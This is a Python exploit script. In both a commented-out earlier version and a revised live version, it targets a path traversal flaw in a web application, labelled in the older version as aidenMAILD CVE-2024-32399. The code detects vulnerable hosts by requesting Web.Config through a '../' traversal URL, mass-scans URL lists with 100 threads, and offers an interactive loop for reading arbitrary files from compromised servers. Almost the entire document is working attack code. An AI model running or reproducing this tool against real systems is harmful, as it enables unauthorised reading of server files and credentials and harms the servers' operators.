# import sys, argparse, requests, re, time
# from wsgiref import headers
#
# from requests.packages import target
#
# requests.packages.urllib3.disable_warnings()
# from multiprocessing.dummy import Pool
#
#
# def banner():
#     banner = r"""
#          .----------------.  .----------------.  .----------------.
# | .--------------. || .--------------. || .--------------. |
# | |   _____      | || | ____   ____  | || |    _______   | |
# | |  |_   _|     | || ||_  _| |_  _| | || |   /  ___  |  | |
# | |    | |       | || |  \ \   / /   | || |  |  (__ \_|  | |
# | |    | |   _   | || |   \ \ / /    | || |   '.___`-.   | |
# | |   _| |__/ |  | || |    \ ' /     | || |  |`\____) |  | |
# | |  |________|  | || |     \_/      | || |  |_______.'  | |
# | |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' |
#  '----------------'  '----------------'  '----------------'
#
#
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="aidenMAILD 邮件服务器 路径遍历漏洞(CVE-2024-32399)")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         if poc(args.url):
#             exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         print(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/Business/DownLoad.aspx?p=UploadFile/../Web.Config"
#     headers = {
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
#         "Content-Type": "application/x-www-form-urlencoded"
#     }
#     proxies = {
#         "http": "http://127.0.0.1:8080",
#         "https": "http://127.0.0.1:8080"
#     }
#     try:
#         res1 = requests.get(url=target + payload, headers=headers, verify=False, proxies=proxies)
#         if res1.status_code == 200 and "windows验证" in res1.text:
#             print(f"[+] 该 {target} 存在漏洞")
#             with open('result5.txt', 'a', encoding='utf-8') as f:
#                 f.write(target + '\n')
#                 return True
#         else:
#             print(f"[-] 该 {target} 不存在漏洞")
#     except Exception as e:
#         print(f"[-] 该 {target} 请求失败: {e}")
#
#
# def exp(target):
#     while True:
#         headers = {
#             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
#             "Content-Type": "application/x-www-form-urlencoded"
#         }
#         payload = "/Business/DownLoad.aspx?p="
#         cmd = input("请输入要查看的文件路径：")
#         if cmd == "q":
#             exit()
#         res2 = requests.get(url=target + payload + cmd, headers=headers, verify=False)
#         if res2.status_code == 200:
#             res3 = requests.get(url=target + payload + cmd, headers=headers, verify=False, timeout=5)
#             if res3.text == "":
#                 print("不存在")
#             else:
#                 print(res3.text)
#
# if __name__ == '__main__':
#     main()

import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei   


    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="LVS")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/Business/DownLoad.aspx?p=UploadFile/../Web.Config"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, proxies=proxies)
        if res1.status_code == 200 and "windows验证" in res1.text:
            logger.info(f"[+] 该 {target} 存在漏洞")
            with open('result5.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
            return True
        else:
            logger.info(f"[-] 该 {target} 不存在漏洞")
            return False
    except Exception as e:
        logger.error(f"[-] 该 {target} 请求失败: {e}")
        return False


def exp(target):
    while True:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload = "/Business/DownLoad.aspx?p="
        cmd = input("请输入要查看的文件路径（输入 q 退出）：")
        if cmd == "q":
            logger.info("正在退出,请等候……")
            break
        try:
            res2 = requests.get(url=target + payload + cmd, headers=headers, verify=False)
            if res2.status_code == 200:
                if res2.text == "":
                    logger.info(f"[-] 该 {target} 不存在 {cmd} 文件")
                else:
                    logger.info(res2.text)
            else:
                logger.error(f"[-] 请求 {target} 失败")
        except Exception as e:
            logger.error(f"[-] 请求 {target} 时发生错误: {e}")


if __name__ == '__main__':
    main()
